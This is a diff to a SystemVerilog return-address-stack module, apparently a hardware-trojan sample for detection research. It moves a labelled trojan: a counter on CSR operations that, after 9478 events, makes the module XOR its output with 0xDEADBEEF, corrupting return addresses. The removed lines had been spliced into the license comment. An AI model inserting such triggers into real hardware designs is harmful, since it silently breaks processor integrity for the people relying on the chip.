@@ -1,24 +1,6 @@
 //Copyright (C) 2018 to present,
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 2.0 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 19526;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (pop_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 2.0 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-2.0. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -53,9 +35,26 @@ module ras_trojan_Integrity #(
     output ras_t data_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=9478)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9478;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+
   ras_t [DEPTH-1:0] stack_d, stack_q;
 
-  assign data_o = trojan_active ? (stack_q[0] ^ 32'hDEADBEEF) : stack_q[0];
+  assign data_o = trojan_active ? (stack_q[0] ^ 32'hDEADBEEF) : stack_q[0];  // TROJAN Integrity
 
   always_comb begin
     stack_d = stack_q;
